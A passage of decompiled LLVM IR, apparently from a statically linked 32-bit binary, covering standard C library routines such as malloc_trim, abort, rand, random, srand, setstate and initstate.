  store i32 ptrtoint (i8* @global_var_8060480.225 to i32), i32* @edx, align 4
  %v0_8050b20 = load i32, i32* @global_var_80607c8.240, align 8
  store i32 %v0_8050b20, i32* @eax, align 4
  %v0_8050b25 = call i32 @__malloc_trim()
  store i32 %v0_8050b25, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050b4c

dec_label_pc_8050b2c:                             ; preds = %dec_label_pc_8050a34
  %v2_8050b2c = inttoptr i32 %v1_80509fd to i32*
  %v3_8050b2c = load i32, i32* %v2_8050b2c, align 4
  %v0_8050b2f = load i32, i32* @global_var_80607d0.233, align 16
  %v1_8050b2f = add i32 %v0_8050b2f, -1
  store i32 %v1_8050b2f, i32* @global_var_80607d0.233, align 16
  %v2_8050b35 = add i32 %v3_8050b2c, %v1_8050a0d
  store i32 %v2_8050b35, i32* %eax.global-to-local, align 4
  %v2_8050b38 = sub i32 %v1_80509fd, %v3_8050b2c
  %v0_8050b3e = load i32, i32* @global_var_80607e4.236, align 4
  %v2_8050b3e = sub i32 %v0_8050b3e, %v2_8050b35
  store i32 %v2_8050b3e, i32* @global_var_80607e4.236, align 4
  %v4_8050b44 = call i32 @munmap(i32 %v2_8050b38, i32 %v2_8050b35, i32 %v1_8050a0d, i32 %v1_8050a0d)
  store i32 %v4_8050b44, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050b4c

dec_label_pc_8050b4c:                             ; preds = %dec_label_pc_8050b08, %dec_label_pc_8050ae7, %dec_label_pc_8050b1b, %dec_label_pc_8050a14, %dec_label_pc_8050b2c
  store i32 %v2_80509e7, i32* @eax, align 4
  %v2_8050b55 = call i32 @__pthread_return_void(i32 %v2_80509e7, i32 1)
  store i32 %v2_8050b55, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050b5d

dec_label_pc_8050b5d:                             ; preds = %entry, %dec_label_pc_8050b4c
  %.0 = phi i32 [ undef, %entry ], [ %v2_8050b55, %dec_label_pc_8050b4c ]
  store i32 %v0_80509cc, i32* @ebx, align 4
  store i32 %v0_80509cb, i32* @esi, align 4
  store i32 %v0_80509ca, i32* @edi, align 4
  store i32 %v0_80509c9, i32* @ebp, align 4
  ret i32 %.0

; uselistorder directives
  uselistorder i32 %v3_8050b2c, { 1, 0 }
  uselistorder i32 %v0_8050ac1, { 1, 0 }
  uselistorder i32 %v1_8050a8c, { 1, 0 }
  uselistorder i32 %v2_8050a85, { 1, 0 }
  uselistorder i32 %v1_8050a7a, { 0, 2, 1, 3 }
  uselistorder i32 %v1_8050a89, { 1, 0 }
  uselistorder i32 %v1_8050a0d, { 3, 4, 0, 1, 2, 5, 6 }
  uselistorder i32 %v3_8050a08, { 1, 2, 0, 3 }
  uselistorder i32 %v1_80509fd, { 1, 4, 2, 3, 0, 5 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 5, 3, 4, 6, 7, 8, 9, 10, 11, 14, 15, 12, 13, 16, 17, 18, 19, 20, 21, 22, 23, 24 }
  uselistorder i32* bitcast (i8* @global_var_8060480.225 to i32*), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint (i32* @global_var_80604b4.228 to i32), { 1, 2, 3, 4, 5, 6, 7, 0, 8 }
  uselistorder i32* @global_var_80604ac.226, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 9, 10, 11 }
  uselistorder i32 ptrtoint (i32* @global_var_805a010.224 to i32), { 0, 1, 3, 2, 4 }
  uselistorder i32 %arg1, { 1, 0, 4, 3, 2 }
  uselistorder label %dec_label_pc_8050b5d, { 1, 0 }
  uselistorder label %dec_label_pc_8050b4c, { 4, 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_8050b08, { 1, 0 }
  uselistorder label %dec_label_pc_8050ae7, { 1, 0 }
  uselistorder label %dec_label_pc_8050ab2, { 1, 0 }
  uselistorder label %dec_label_pc_8050aaa, { 1, 0 }
  uselistorder label %dec_label_pc_8050a76, { 1, 0 }
}

define i32 @malloc_trim(i32 %arg1) local_unnamed_addr {
entry:
  %v0_8050b65 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v3_8050b72 = call i32 @__malloc_consolidate(i32* inttoptr (i32 sext (i8 ptrtoint (i8* @global_var_8060480.225 to i8) to i32) to i32*))
  %v0_8050b77 = load i32, i32* @ebx, align 4
  store i32 %v0_8050b77, i32* @eax, align 4
  store i32 ptrtoint (i8* @global_var_8060480.225 to i32), i32* @edx, align 4
  store i32 %v0_8050b65, i32* @ebx, align 4
  %v0_8050b82 = call i32 @__malloc_trim()
  ret i32 %v0_8050b82

; uselistorder directives
  uselistorder i32 ()* @__malloc_trim, { 1, 0 }
  uselistorder i32 ptrtoint (i8* @global_var_8060480.225 to i32), { 8, 7, 6, 0, 5, 4, 1, 3, 2 }
  uselistorder i8* @global_var_8060480.225, { 0, 5, 8, 7, 6, 4, 1, 3, 2 }
}

define i32 @abort() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-272 = alloca i32, align 4
  %stack_var_-132 = alloca i32, align 4
  %stack_var_-284 = alloca i32, align 4
  %v1_8050b94 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805a028.245 to i32))
  %v12_8050b9e = ptrtoint i32* %stack_var_-284 to i32
  store i32 31, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050ba3

dec_label_pc_8050ba3:                             ; preds = %dec_label_pc_8050ba3.dec_label_pc_8050ba3_crit_edge, %entry
  %v0_8050ba3 = phi i32 [ %v12_8050b9e, %entry ], [ %v0_8050ba3.pre, %dec_label_pc_8050ba3.dec_label_pc_8050ba3_crit_edge ]
  %v1_8050bae22 = phi i32 [ 31, %entry ], [ %v1_8050bae, %dec_label_pc_8050ba3.dec_label_pc_8050ba3_crit_edge ]
  %v2_8050ba3 = mul i32 %v1_8050bae22, 4
  %v3_8050ba3 = add i32 %v2_8050ba3, 152
  %v4_8050ba3 = add i32 %v3_8050ba3, %v0_8050ba3
  %v5_8050ba3 = inttoptr i32 %v4_8050ba3 to i32*
  store i32 0, i32* %v5_8050ba3, align 4
  %v0_8050bae.pre = load i32, i32* %eax.global-to-local, align 4
  %v1_8050bae = add i32 %v0_8050bae.pre, -1
  %v9_8050bae = icmp slt i32 %v1_8050bae, 0
  store i32 %v1_8050bae, i32* %eax.global-to-local, align 4
  %v1_8050baf = icmp eq i1 %v9_8050bae, false
  br i1 %v1_8050baf, label %dec_label_pc_8050ba3.dec_label_pc_8050ba3_crit_edge, label %dec_label_pc_8050bb1

dec_label_pc_8050ba3.dec_label_pc_8050ba3_crit_edge: ; preds = %dec_label_pc_8050ba3
  %v0_8050ba3.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8050ba3

dec_label_pc_8050bb1:                             ; preds = %dec_label_pc_8050ba3
  %v0_8050bb1 = load i32, i32* @ebx, align 4
  %v2_8050bb5 = ptrtoint i32* %stack_var_-132 to i32
  store i32 %v2_8050bb5, i32* @ebx, align 4
  %v4_8050bbd = call i32 @__sigaddset(i32 %v2_8050bb5, i32 6, i32 %v0_8050bb1, i32 %v0_8050bb1)
  store i32 %v4_8050bbd, i32* %eax.global-to-local, align 4
  %v1_8050bc5 = icmp eq i32 %v4_8050bbd, 0
  %v1_8050bc7 = icmp eq i1 %v1_8050bc5, false
  br i1 %v1_8050bc7, label %dec_label_pc_8050bd7, label %dec_label_pc_8050bc9

dec_label_pc_8050bc9:                             ; preds = %dec_label_pc_8050bb1
  %v3_8050bcf = bitcast i32* %stack_var_-132 to %_TYPEDEF_sigset_t*
  %v4_8050bcf = call i32 @__GI_sigprocmask(i32 1, %_TYPEDEF_sigset_t* %v3_8050bcf, i32 0)
  store i32 %v4_8050bcf, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050bd7

dec_label_pc_8050bd7:                             ; preds = %dec_label_pc_8050bb1, %dec_label_pc_8050bc9
  %v2_8050c0f4 = phi i32 [ %v4_8050bbd, %dec_label_pc_8050bb1 ], [ %v4_8050bcf, %dec_label_pc_8050bc9 ]
  %v0_8050bd7 = load i8, i8* @global_var_80603a0.246, align 32
  %v1_8050bd7 = icmp eq i8 %v0_8050bd7, 0
  %v1_8050bde = icmp eq i1 %v1_8050bd7, false
  br i1 %v1_8050bde, label %dec_label_pc_8050c0f, label %dec_label_pc_8050be0

dec_label_pc_8050be0:                             ; preds = %dec_label_pc_8050bd7
  store i8 1, i8* @global_var_80603a0.246, align 32
  br label %dec_label_pc_8050be7

dec_label_pc_8050be7:                             ; preds = %dec_label_pc_8050c4e, %dec_label_pc_8050be0
  %v1_8050bef = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805a028.245 to i32))
  store i32 %v1_8050bef, i32* %eax.global-to-local, align 4
  %v1_8050bfb = call i32 @__raise(i32 6)
  store i32 %v1_8050bfb, i32* %eax.global-to-local, align 4
  %v1_8050c07 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805a028.245 to i32))
  store i32 %v1_8050c07, i32* %eax.global-to-local, align 4
  %v0_8050c0f.pre = load i8, i8* @global_var_80603a0.246, align 32
  br label %dec_label_pc_8050c0f

dec_label_pc_8050c0f:                             ; preds = %dec_label_pc_8050bd7, %dec_label_pc_8050be7
  %v2_8050c0f = phi i32 [ %v2_8050c0f4, %dec_label_pc_8050bd7 ], [ %v1_8050c07, %dec_label_pc_8050be7 ]
  %v0_8050c0f = phi i8 [ %v0_8050bd7, %dec_label_pc_8050bd7 ], [ %v0_8050c0f.pre, %dec_label_pc_8050be7 ]
  %v1_8050c0f = zext i8 %v0_8050c0f to i32
  %v3_8050c0f = and i32 %v2_8050c0f, -256
  %v4_8050c0f = or i32 %v1_8050c0f, %v3_8050c0f
  store i32 %v4_8050c0f, i32* %eax.global-to-local, align 4
  %v10_8050c14 = icmp eq i8 %v0_8050c0f, 1
  %v1_8050c16 = icmp eq i1 %v10_8050c14, false
  br i1 %v1_8050c16, label %dec_label_pc_8050c70, label %dec_label_pc_8050c18

dec_label_pc_8050c18:                             ; preds = %dec_label_pc_8050c0f
  store i8 2, i8* @global_var_80603a0.246, align 32
  %v2_8050c27 = ptrtoint i32* %stack_var_-272 to i32
  store i32 %v2_8050c27, i32* %eax.global-to-local, align 4
  %v3_8050c2c = bitcast i32* %stack_var_-272 to i8*
  %v4_8050c2c = call i32 @__GI_memset(i8* %v3_8050c2c, i32 0, i32 140)
  store i32 0, i32* %stack_var_-272, align 4
  store i32 31, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050c43

dec_label_pc_8050c43:                             ; preds = %dec_label_pc_8050c43.dec_label_pc_8050c43_crit_edge, %dec_label_pc_8050c18
  %v0_8050c43 = phi i32 [ %v12_8050b9e, %dec_label_pc_8050c18 ], [ %v0_8050c43.pre, %dec_label_pc_8050c43.dec_label_pc_8050c43_crit_edge ]
  %v1_8050c4b21 = phi i32 [ 31, %dec_label_pc_8050c18 ], [ %v1_8050c4b, %dec_label_pc_8050c43.dec_label_pc_8050c43_crit_edge ]
  %v2_8050c43 = mul i32 %v1_8050c4b21, 4
  %v3_8050c43 = add i32 %v2_8050c43, 16
  %v4_8050c43 = add i32 %v3_8050c43, %v0_8050c43
  %v5_8050c43 = inttoptr i32 %v4_8050c43 to i32*
  store i32 -1, i32* %v5_8050c43, align 4
  %v0_8050c4b.pre = load i32, i32* %eax.global-to-local, align 4
  %v1_8050c4b = add i32 %v0_8050c4b.pre, -1
  %v9_8050c4b = icmp slt i32 %v1_8050c4b, 0
  store i32 %v1_8050c4b, i32* %eax.global-to-local, align 4
  %v1_8050c4c = icmp eq i1 %v9_8050c4b, false
  br i1 %v1_8050c4c, label %dec_label_pc_8050c43.dec_label_pc_8050c43_crit_edge, label %dec_label_pc_8050c4e

dec_label_pc_8050c43.dec_label_pc_8050c43_crit_edge: ; preds = %dec_label_pc_8050c43
  %v0_8050c43.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8050c43

dec_label_pc_8050c4e:                             ; preds = %dec_label_pc_8050c43
  store i32 %v2_8050c27, i32* %eax.global-to-local, align 4
  %v4_8050c63 = call i32 @__libc_sigaction(i32 6, i32* nonnull %stack_var_-272, i32 0)
  store i32 %v4_8050c63, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050be7

dec_label_pc_8050c70:                             ; preds = %dec_label_pc_8050c0f
  %v10_8050c70 = icmp eq i8 %v0_8050c0f, 2
  %v1_8050c72 = icmp eq i1 %v10_8050c70, false
  br i1 %v1_8050c72, label %dec_label_pc_8050c7c, label %dec_label_pc_8050c7c.thread

dec_label_pc_8050c7c.thread:                      ; preds = %dec_label_pc_8050c70
  store i8 3, i8* @global_var_80603a0.246, align 32
  br label %dec_label_pc_8050c85

dec_label_pc_8050c7c:                             ; preds = %dec_label_pc_8050c70
  %v9_8050c7c = icmp eq i8 %v0_8050c0f, 3
  %v1_8050c83 = icmp eq i1 %v9_8050c7c, false
  br i1 %v1_8050c83, label %dec_label_pc_8050c96, label %dec_label_pc_8050c85

dec_label_pc_8050c85:                             ; preds = %dec_label_pc_8050c7c.thread, %dec_label_pc_8050c7c
  store i8 4, i8* @global_var_80603a0.246, align 32
  %v1_8050c91 = call i32 @__GI__exit(i32 127)
  unreachable

dec_label_pc_8050c96:                             ; preds = %dec_label_pc_8050c7c, %dec_label_pc_8050c96
  br label %dec_label_pc_8050c96

; uselistorder directives
  uselistorder i32 %v1_8050c4b, { 2, 1, 0 }
  uselistorder i32 %v1_8050bae, { 2, 1, 0 }
  uselistorder i32* %stack_var_-272, { 0, 2, 1, 3 }
  uselistorder i32* %eax.global-to-local, { 6, 7, 9, 8, 1, 10, 11, 12, 13, 14, 2, 3, 5, 4, 0 }
  uselistorder i8 3, { 0, 4, 3, 1, 2 }
  uselistorder i8* @global_var_80603a0.246, { 5, 4, 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_8050c96, { 1, 0 }
  uselistorder label %dec_label_pc_8050c85, { 1, 0 }
  uselistorder label %dec_label_pc_8050c0f, { 1, 0 }
  uselistorder label %dec_label_pc_8050bd7, { 1, 0 }
}

define i32 @rand() local_unnamed_addr {
entry:
  %v0_8050c9c = call i32 @random()
  ret i32 %v0_8050c9c

; uselistorder directives
  uselistorder i32 ()* @random, { 11, 10, 3, 2, 1, 0, 7, 6, 5, 4, 9, 8 }
}

define i32 @random() local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8050ca4 = load i32, i32* @ebx, align 4
  store i32 %v0_8050ca4, i32* %stack_var_-4, align 4
  %v2_8050cb2 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_8050cb2, i32* @ebx, align 4
  %v2_8050cb7 = call i32 @__pthread_return_void(i32 %v2_8050cb2, i32 134550911)
  %v1_8050cc3 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805a040.247 to i32))
  %v2_8050cca = ptrtoint i32* %stack_var_-8 to i32
  %v3_8050cd4 = call i32 @__GI_random_r(i32* nonnull @global_var_805a058, i32 %v2_8050cca)
  store i32 ptrtoint (i32* @global_var_805a058 to i32), i32* @eax, align 4
  %v2_8050cde = call i32 @__pthread_return_void(i32 %v2_8050cb2, i32 1)
  %v3_8050ce3 = load i32, i32* %stack_var_-8, align 4
  %v2_8050cea = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8050cea, i32* @ebx, align 4
  ret i32 %v3_8050ce3
}

define i32 @setstate(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 0, i32* @esi, align 4
  %v2_8050cfd = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_8050cfd, i32* @eax, align 4
  %v2_8050d02 = call i32 @__pthread_return_void(i32 %v2_8050cfd, i32 134550911)
  %v1_8050d0e = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805a040.247 to i32))
  %v0_8050d1a = load i32, i32* bitcast (i32** @global_var_805a060.250 to i32*), align 32
  store i32 %v0_8050d1a, i32* @ebx, align 4
  %v3_8050d24 = call i32 @setstate_r(i32 %arg1, i32* nonnull @global_var_805a058)
  %v2_8050d2c = icmp slt i32 %v3_8050d24, 0
  br i1 %v2_8050d2c, label %dec_label_pc_8050d33, label %dec_label_pc_8050d30

dec_label_pc_8050d30:                             ; preds = %entry
  store i32 ptrtoint (i32** @global_var_805a05c.251 to i32), i32* @esi, align 4
  br label %dec_label_pc_8050d33

dec_label_pc_8050d33:                             ; preds = %entry, %dec_label_pc_8050d30
  store i32 %v2_8050cfd, i32* @eax, align 4
  %v2_8050d3c = call i32 @__pthread_return_void(i32 %v2_8050cfd, i32 1)
  %v0_8050d41 = load i32, i32* @esi, align 4
  ret i32 %v0_8050d41

; uselistorder directives
  uselistorder label %dec_label_pc_8050d33, { 1, 0 }
}

define i32 @initstate(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  %v2_8050d58 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_8050d58, i32* @ebx, align 4
  %v2_8050d5d = call i32 @__pthread_return_void(i32 %v2_8050d58, i32 134550911)
  %v1_8050d69 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805a040.247 to i32))
  %v0_8050d73 = load i32, i32* bitcast (i32** @global_var_805a060.250 to i32*), align 32
  store i32 %v0_8050d73, i32* @esi, align 4
  %v4_8050d85 = inttoptr i32 %arg2 to i32*
  %v5_8050d85 = call i32 @__GI_initstate_r(i32 %arg1, i32* %v4_8050d85, i32 %arg3, i32 ptrtoint (i32* @global_var_805a058 to i32))
  store i32 %v5_8050d85, i32* @eax, align 4
  %v2_8050d90 = call i32 @__pthread_return_void(i32 %v2_8050d58, i32 1)
  ret i32 ptrtoint (i32** @global_var_805a05c.251 to i32)
}

define i32 @srand(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8050da0 = load i32, i32* @ebx, align 4
  store i32 %v0_8050da0, i32* %stack_var_-4, align 4
  %v2_8050dae = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_8050dae, i32* @ebx, align 4
  %v2_8050db3 = call i32 @__pthread_return_void(i32 %v2_8050dae, i32 134550911)
  %v1_8050dbf = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805a040.247 to i32))
  %v2_8050dcf = sext i32 %arg1 to i64
  %v3_8050dcf = call i32 @srandom_r(i64 %v2_8050dcf, i32 ptrtoint (i32* @global_var_805a058 to i32))
  store i32 ptrtoint (i32* @global_var_805a058 to i32), i32* @eax, align 4
  %v2_8050dd9 = call i32 @__pthread_return_void(i32 %v2_8050dae, i32 1)
  %v2_8050de1 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8050de1, i32* @ebx, align 4
  ret i32 %v2_8050dd9

; uselistorder directives
  uselistorder i32* @global_var_805a058, { 0, 2, 1 }
  uselistorder i32 ptrtoint (i32* @global_var_805a058 to i32), { 1, 3, 2, 0 }
}

define i32 @setstate_r(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp4 = ptrtoint i32* %arg2 to i32
  %v0_8050de7 = load i32, i32* @ebx, align 4
  store i32 %tmp4, i32* %ebx.global-to-local, align 4
  %v1_8050df3 = add i32 %arg1, 4
  store i32 %v1_8050df3, i32* %esi.global-to-local, align 4
  %v1_8050df6 = add i32 %tmp4, 12
  %v2_8050df6 = inttoptr i32 %v1_8050df6 to i32*
  %v3_8050df6 = load i32, i32* %v2_8050df6, align 4
  store i32 %v3_8050df6, i32* %ecx.global-to-local, align 4
  %v1_8050df9 = add i32 %tmp4, 8
  %v2_8050df9 = inttoptr i32 %v1_8050df9 to i32*
  %v3_8050df9 = load i32, i32* %v2_8050df9, align 4
  %v1_8050dfc = icmp eq i32 %v3_8050df6, 0
  %v1_8050dfe = icmp eq i1 %v1_8050dfc, false
  br i1 %v1_8050dfe, label %dec_label_pc_8050e09, label %dec_label_pc_8050e00

dec_label_pc_8050e00:                             ; preds = %entry
  %v1_8050e00 = add i32 %v3_8050df9, -4
  %v2_8050e00 = inttoptr i32 %v1_8050e00 to i32*
  store i32 0, i32* %v2_8050e00, align 4
  br label %dec_label_pc_8050e19

dec_label_pc_8050e09:                             ; preds = %entry
  %v1_8050e09 = add i32 %tmp4, 4
  %v2_8050e09 = inttoptr i32 %v1_8050e09 to i32*
  %v3_8050e09 = load i32, i32* %v2_8050e09, align 4
  %v2_8050e0c = sub i32 %v3_8050e09, %v3_8050df9
  %v2_8050e0e = sdiv i32 %v2_8050e0c, 4
  %v3_8050e11 = mul i32 %v2_8050e0e, 5
  %v2_8050e14 = add i32 %v3_8050e11, %v3_8050df6
  store i32 %v2_8050e14, i32* %eax.global-to-local, align 4
  %v2_8050e16 = add i32 %v3_8050df9, -4
  %v3_8050e16 = inttoptr i32 %v2_8050e16 to i32*
  store i32 %v2_8050e14, i32* %v3_8050e16, align 4
  br label %dec_label_pc_8050e19

dec_label_pc_8050e19:                             ; preds = %dec_label_pc_8050e00, %dec_label_pc_8050e09
  %v0_8050e19 = load i32, i32* %esi.global-to-local, align 4
  %v1_8050e19 = add i32 %v0_8050e19, -4
  %v2_8050e19 = inttoptr i32 %v1_8050e19 to i32*
  %v3_8050e19 = load i32, i32* %v2_8050e19, align 4
  store i32 5, i32* %edi.global-to-local, align 4
  %v1_8050e21 = ashr i32 %v3_8050e19, 31
  %v2_8050e22 = zext i32 %v3_8050e19 to i64
  %v4_8050e22 = zext i32 %v1_8050e21 to i64
  %v5_8050e22 = mul nuw i64 %v4_8050e22, 4294967296
  %v6_8050e22 = or i64 %v5_8050e22, %v2_8050e22
  %v8_8050e22 = sdiv i64 %v6_8050e22, 5
  %v9_8050e22 = trunc i64 %v8_8050e22 to i32
  store i32 %v9_8050e22, i32* %eax.global-to-local, align 4
  %v10_8050e22 = srem i64 %v6_8050e22, 5
  %v11_8050e22 = trunc i64 %v10_8050e22 to i32
  %v6_8050e27 = icmp ugt i32 %v11_8050e22, 4
  br i1 %v6_8050e27, label %dec_label_pc_8050e67, label %dec_label_pc_8050e29

dec_label_pc_8050e29:                             ; preds = %dec_label_pc_8050e19
  %v1_8050e29 = mul i32 %v11_8050e22, 4
  %v2_8050e29 = add i32 %v1_8050e29, ptrtoint (i32* @global_var_80579f4.252 to i32)
  %v3_8050e29 = inttoptr i32 %v2_8050e29 to i32*
  %v4_8050e29 = load i32, i32* %v3_8050e29, align 4
  store i32 %v4_8050e29, i32* %ecx.global-to-local, align 4
  %v2_8050e30 = add i32 %v1_8050e29, ptrtoint (i32* @global_var_80579e0.253 to i32)
  %v3_8050e30 = inttoptr i32 %v2_8050e30 to i32*
  %v4_8050e30 = load i32, i32* %v3_8050e30, align 4
  store i32 %v4_8050e30, i32* %ebp.global-to-local, align 4
  %v1_8050e37 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8050e37 = add i32 %v1_8050e37, 16
  %v3_8050e37 = inttoptr i32 %v2_8050e37 to i32*
  store i32 %v4_8050e29, i32* %v3_8050e37, align 4
  %v0_8050e3a = load i32, i32* %ebp.global-to-local, align 4
  %v1_8050e3a = load i32, i32* %ebx.global-to-local, align 4
  %v2_8050e3a = add i32 %v1_8050e3a, 20
  %v3_8050e3a = inttoptr i32 %v2_8050e3a to i32*
  store i32 %v0_8050e3a, i32* %v3_8050e3a, align 4
  %v1_8050e3d = load i32, i32* %ebx.global-to-local, align 4
  %v2_8050e3d = add i32 %v1_8050e3d, 12
  %v3_8050e3d = inttoptr i32 %v2_8050e3d to i32*
  store i32 %v11_8050e22, i32* %v3_8050e3d, align 4
  %v1_8050e40 = icmp eq i32 %v11_8050e22, 0
  br i1 %v1_8050e40, label %dec_label_pc_8050e5a, label %dec_label_pc_8050e44

dec_label_pc_8050e44:                             ; preds = %dec_label_pc_8050e29
  %v0_8050e44 = load i32, i32* %esi.global-to-local, align 4
  %v1_8050e44 = add i32 %v0_8050e44, -4
  %v2_8050e44 = inttoptr i32 %v1_8050e44 to i32*
  %v3_8050e44 = load i32, i32* %v2_8050e44, align 4
  %v1_8050e47 = ashr i32 %v3_8050e44, 31
  %v0_8050e48 = load i32, i32* %edi.global-to-local, align 4
  %v2_8050e48 = zext i32 %v3_8050e44 to i64
  %v4_8050e48 = zext i32 %v1_8050e47 to i64
  %v5_8050e48 = mul nuw i64 %v4_8050e48, 4294967296
  %v6_8050e48 = or i64 %v5_8050e48, %v2_8050e48
  %v7_8050e48 = zext i32 %v0_8050e48 to i64
  %v8_8050e48 = sdiv i64 %v6_8050e48, %v7_8050e48
  %v9_8050e48 = trunc i64 %v8_8050e48 to i32
  %v2_8050e4a = mul i32 %v9_8050e48, 4
  %v3_8050e4a = add i32 %v2_8050e4a, %v0_8050e44
  %v1_8050e4d = load i32, i32* %ebp.global-to-local, align 4
  %v2_8050e4d = add i32 %v1_8050e4d, %v9_8050e48
  store i32 %v2_8050e4d, i32* %eax.global-to-local, align 4
  %v1_8050e4f = load i32, i32* %ebx.global-to-local, align 4
  %v2_8050e4f = add i32 %v1_8050e4f, 4
  %v3_8050e4f = inttoptr i32 %v2_8050e4f to i32*
  store i32 %v3_8050e4a, i32* %v3_8050e4f, align 4
  %v0_8050e52 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050e52 = ashr i32 %v0_8050e52, 31
  %v0_8050e53 = load i32, i32* %ecx.global-to-local, align 4
  %v2_8050e53 = zext i32 %v0_8050e52 to i64
  %v4_8050e53 = zext i32 %v1_8050e52 to i64
  %v5_8050e53 = mul nuw i64 %v4_8050e53, 4294967296
  %v6_8050e53 = or i64 %v5_8050e53, %v2_8050e53
  %v7_8050e53 = zext i32 %v0_8050e53 to i64
  %v8_8050e53 = sdiv i64 %v6_8050e53, %v7_8050e53
  %v9_8050e53 = trunc i64 %v8_8050e53 to i32
  store i32 %v9_8050e53, i32* %eax.global-to-local, align 4
  %v10_8050e53 = srem i64 %v6_8050e53, %v7_8050e53
  %v11_8050e53 = trunc i64 %v10_8050e53 to i32
  %v0_8050e55 = load i32, i32* %esi.global-to-local, align 4
  %v2_8050e55 = mul i32 %v11_8050e53, 4
  %v3_8050e55 = add i32 %v2_8050e55, %v0_8050e55
  %v1_8050e58 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8050e58 = inttoptr i32 %v1_8050e58 to i32*
  store i32 %v3_8050e55, i32* %v2_8050e58, align 4
  br label %dec_label_pc_8050e5a

dec_label_pc_8050e5a:                             ; preds = %dec_label_pc_8050e29, %dec_label_pc_8050e44
  %v0_8050e5a = load i32, i32* %esi.global-to-local, align 4
  %v1_8050e5a = load i32, i32* %ecx.global-to-local, align 4
  %v2_8050e5a = mul i32 %v1_8050e5a, 4
  %v3_8050e5a = add i32 %v2_8050e5a, %v0_8050e5a
  store i32 %v3_8050e5a, i32* %eax.global-to-local, align 4
  %v1_8050e5d = load i32, i32* %ebx.global-to-local, align 4
  %v2_8050e5d = add i32 %v1_8050e5d, 8
  %v3_8050e5d = inttoptr i32 %v2_8050e5d to i32*
  store i32 %v0_8050e5a, i32* %v3_8050e5d, align 4
  %v0_8050e60 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050e60 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8050e60 = add i32 %v1_8050e60, 24
  %v3_8050e60 = inttoptr i32 %v2_8050e60 to i32*
  store i32 %v0_8050e60, i32* %v3_8050e60, align 4
  br label %dec_label_pc_8050e75

dec_label_pc_8050e67:                             ; preds = %dec_label_pc_8050e19
  %v1_8050e67 = call i32 @__errno_location(i32 %v0_8050de7)
  store i32 %v1_8050e67, i32* %eax.global-to-local, align 4
  %v1_8050e6c = inttoptr i32 %v1_8050e67 to i32*
  store i32 22, i32* %v1_8050e6c, align 4
  br label %dec_label_pc_8050e75

dec_label_pc_8050e75:                             ; preds = %dec_label_pc_8050e5a, %dec_label_pc_8050e67
  %storemerge = phi i32 [ -1, %dec_label_pc_8050e67 ], [ 0, %dec_label_pc_8050e5a ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  store i32 %v0_8050de7, i32* %ebx.global-to-local, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v0_8050e5a, { 1, 0 }
  uselistorder i32 %v11_8050e22, { 2, 1, 3, 0 }
  uselistorder i32 %tmp4, { 0, 2, 1, 3 }
  uselistorder i32* %eax.global-to-local, { 5, 6, 0, 1, 2, 3, 4, 7, 8 }
  uselistorder i64 5, { 1, 0 }
  uselistorder label %dec_label_pc_8050e75, { 1, 0 }
  uselistorder label %dec_label_pc_8050e5a, { 1, 0 }
  uselistorder label %dec_label_pc_8050e19, { 1, 0 }
}

define i32 @__GI_random_r(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp2 = ptrtoint i32* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v0_8050e80 = load i32, i32* @ebx, align 4
  store i32 %v0_8050e80, i32* %stack_var_-16, align 4
  store i32 %tmp2, i32* %ebx.global-to-local, align 4
  store i32 %arg2, i32* %ebp.global-to-local, align 4
